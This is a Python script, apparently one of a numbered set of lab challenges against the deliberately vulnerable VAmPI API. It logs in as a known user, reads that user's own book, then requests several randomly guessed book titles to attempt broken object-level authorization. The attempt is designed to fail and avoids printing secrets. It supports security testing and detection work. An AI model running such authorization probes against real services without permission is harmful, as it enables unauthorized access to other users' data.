#!/usr/bin/env python3
"""
vampi_challenge_12_bola_books_unsuccessful.py — BOLA on books (attempted, unsuccessful).

Same flow as challenge 03: a legitimate user reads their OWN book (baseline),
then requests other books with the same valid session. The difference: the book
titles here are random guesses that don't exist, so the API rejects every one
(404 "Book not found!") and no foreign secret is ever returned. This is the
"attacker knows the technique but cannot find a valid foreign id" pattern —
the attempt traffic is identical, the access fails.

We deliberately do NOT print secret values — only whether a book's secret was
returned.
Run: python3 vampi_challenge_12_bola_books_unsuccessful.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def has_secret(d):
    """A book read returns either a dict {..,secret} or a list of such."""
    if isinstance(d, dict):
        return "secret" in d
    if isinstance(d, list) and d:
        return "secret" in d[0]
    return False


def main():
    ap = argparse.ArgumentParser(description="BOLA on other users' book secrets (unsuccessful attempt)")
    ap.add_argument("--config", default=find_config())
    ap.add_argument("--count", type=int, default=5, help="number of guessed book titles")
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    u = vc.known_users(cfg)[0]
    own = u["username"]

    token = vc.login(base, own, u["password"], vc.consumer_headers(815), tout)
    if not token:
        print("login failed, skipping")
        return
    h = vc.auth_headers(token)

    # Baseline: ensure the user has at least one OWN book, then read it.
    r = requests.get(f"{base}/books/v1", headers=h, timeout=tout)
    all_books = vc.as_list(r.json())
    mine = [b.get("book_title") for b in all_books if isinstance(b, dict) and b.get("user") == own]
    if mine:
        own_title = mine[0]
    else:
        own_title = vc.rand_book_title(own)
        requests.post(f"{base}/books/v1", json={"book_title": own_title, "secret": vc.rand_password()},
                      headers={**h, "Content-Type": "application/json"}, timeout=tout)

    r = requests.get(f"{base}/books/v1/{own_title}", headers=h, timeout=tout)
    own_has_secret = has_secret(r.json() if r.status_code != 204 else {})
    print(f"baseline  GET /books/v1/{own_title} (own) -> HTTP {r.status_code} secret_present={own_has_secret}")

    # BOLA attempt: read books whose titles we only guessed (they don't exist).
    guesses = [vc.rand_book_title() for _ in range(args.count)]
    exposed = 0
    for i, title in enumerate(guesses, 1):
        r = requests.get(f"{base}/books/v1/{title}", headers=h, timeout=tout)
        d = r.json() if r.status_code not in (204, 404) else {}
        leak = r.status_code == 200 and has_secret(d)
        if leak:
            exposed += 1
        print(f"bola      GET /books/v1/{title} (guessed {i}/{args.count}) -> HTTP {r.status_code} {'[SECRET EXPOSED]' if leak else ''}")

    if exposed:
        print(f"\nDone — {exposed} foreign book secret(s) readable by a non-owner token. (BOLA succeeded — unexpected for this script.)")
    else:
        print(f"\nDone — {args.count} guessed book title(s) probed, 0 readable by a non-owner token. BOLA attempt unsuccessful.")


if __name__ == "__main__":
    main()
